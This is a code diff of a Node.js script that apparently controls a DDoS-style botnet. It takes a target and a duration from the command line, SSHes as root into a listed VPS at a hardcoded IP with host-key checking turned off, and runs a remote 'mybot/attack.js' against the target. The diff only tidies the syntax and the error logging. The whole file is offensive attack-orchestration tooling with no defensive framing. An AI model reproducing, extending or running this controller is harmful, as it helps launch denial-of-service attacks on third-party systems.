@@ -1,8 +1,7 @@
 const { exec } = require('child_process');
 
 const hosts = [
-  'root@209.127.252.42 -p 22022'
-  // Add more VPS hosts here
+  'root@209.127.252.42 -p 22022',
 ];
 
 const target = process.argv[2];
@@ -17,14 +16,11 @@ console.log(`Launching attack on ${target} from ${hosts.length} VPS(s) for ${dur
 
 hosts.forEach((host) => {
   const cmd = `ssh -o StrictHostKeyChecking=no ${host} "node ~/mybot/attack.js ${target} ${duration}"`;
-
   exec(cmd, (err, stdout, stderr) => {
     if (err) {
-      console.error(`[${host}] Error: ${err.message}`);
-      return;
+      console.error(`[${host}] Failed: ${err.message}`);
+    } else {
+      console.log(`[${host}] Launched`);
     }
-    console.log(`[${host}] Launched`);
-    if (stdout) console.log(`[${host}] STDOUT:\n${stdout}`);
-    if (stderr) console.log(`[${host}] STDERR:\n${stderr}`);
   });
 });
